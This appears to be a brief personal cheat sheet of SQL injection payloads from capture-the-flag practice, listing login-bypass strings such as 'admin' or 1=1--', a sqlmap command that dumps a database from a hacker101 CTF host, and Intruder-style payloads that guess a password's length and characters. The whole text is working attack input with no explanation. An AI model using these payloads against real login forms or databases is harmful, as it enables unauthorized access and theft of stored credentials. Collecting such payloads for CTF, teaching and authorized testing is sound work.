# SQLi (Structured Query Language Injection)

`admin' or 1=1--`

`admin" or 1=1#`

`admin' or '1'='1`

`sqlmap -u https://ba4aeefe40a56952d13df303174a9ff9.ctf.hacker101.com/fetch?id=1 /login --data "username=a&password=b" -p username --dump`

`username=' or LENGTH(password)=§1§#&password=administrator username=' or username LIKE '§`_`§§`_`§§`_`§§`_`§§`_`§§`_`§§`_`§§`_`§'#&password=administrator`
